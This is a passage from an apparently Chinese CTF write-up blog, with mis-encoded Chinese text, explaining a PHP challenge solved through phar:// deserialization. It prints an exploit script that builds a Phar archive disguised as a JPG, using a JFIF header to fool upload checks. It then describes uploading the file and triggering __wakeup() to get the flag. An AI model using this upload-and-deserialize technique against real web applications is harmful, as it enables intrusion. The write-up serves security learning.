class="line">$file-&gt;check($filetype,$filename);</span><br><span class="line">$file-&gt;upload($filetemp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¹¶æ²¡æœ‰ <code>unserialize()</code>å‡½æ•°ï¼Œä½†æ ¹æ®æºç ï¼Œè¦è§¦å‘ <code>__wakeup()</code>å‡½æ•°æ‰èƒ½å¾—åˆ°flag</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>phar://</code>åè®®ï¼Œè§¦å‘ååºåˆ—</p>
<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//ç”Ÿæˆå¯¹åº”å¯è¢«åˆ©ç”¨çš„å¯¹è±¡</span></span><br><span class="line">    $o = <span class="keyword">new</span> File();</span><br><span class="line">    @unlink(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"JFIF"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ jpgæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶  text.txtå†…å®¹éšæ„</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191114132547110.png" alt="image-20191114132547110"></p>
<p>åˆ©ç”¨<code>phar://</code>åè®®è§¦å‘åºåˆ—åŒ–</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191114132652219.png" alt="image-20191114132652219"></p>
<p>è§£ç å¾—åˆ°flag</p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>WP</tag>
      </tags>
  </entry>
</search>
